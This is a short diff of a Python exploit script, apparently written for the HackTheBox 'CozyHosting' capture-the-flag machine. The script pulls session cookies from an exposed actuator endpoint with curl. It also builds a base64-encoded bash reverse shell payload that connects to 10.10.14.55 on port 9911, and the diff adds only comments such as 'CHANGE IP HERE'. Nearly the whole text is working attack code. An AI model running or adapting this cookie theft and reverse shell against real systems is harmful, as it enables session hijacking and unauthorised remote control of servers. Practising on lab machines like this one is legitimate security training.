@@ -1,9 +1,8 @@
 import os
 import json
 import urllib.parse
-# import subprocess
-# import requests
 
+#Get the session cookies
 curlCommand="curl -s  http://cozyhosting.htb/actuator/sessions -o outfile.txt"
 
 exitCode=os.system(curlCommand);
@@ -53,7 +52,7 @@ else:
 
 
 # encoding the payload using base64
-encoded=os.system("echo 'bash -i >& /dev/tcp/10.10.14.55/9911 0>&1'| base64 -w 0 > encoded.txt")
+encoded=os.system("echo 'bash -i >& /dev/tcp/10.10.14.55/9911 0>&1'| base64 -w 0 > encoded.txt") # CHANGE IP HERE
 encoded=cleaning('encoded.txt')
 
 #final payload
